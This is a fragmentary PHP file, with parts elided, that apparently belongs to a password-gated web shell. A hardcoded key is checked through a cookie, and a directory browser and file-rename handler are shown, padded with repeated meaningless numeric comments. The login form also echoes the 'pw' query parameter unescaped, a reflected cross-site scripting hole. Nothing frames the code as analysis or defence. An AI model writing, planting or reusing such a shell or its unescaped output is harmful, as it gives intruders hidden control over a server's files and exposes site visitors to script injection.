...
$pass = false;
if (isset($_COOKIE['pw_name_37405'])) {
    if(($_COOKIE['pw_name_37405']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_37405'])) {
        if(($_POST['pw_name_37405']) == $auth_key) {
            setcookie("pw_name_37405", $_POST['pw_name_37405']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_37405' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1707440328421905 1707440328756959 1707440328723312 1707440328853207
echo <<<HEAD
<!DOCTYPE html>
<html lang="en">
<head>
...
HEAD;// 1707440328421905 1707440328756959 1707440328723312 1707440328853207
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1707440328421905 1707440328756959 1707440328723312 1707440328853207
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1707440328421905 1707440328756959 1707440328723312 1707440328853207
            $name = PATH . "/" . $_GET['r'];
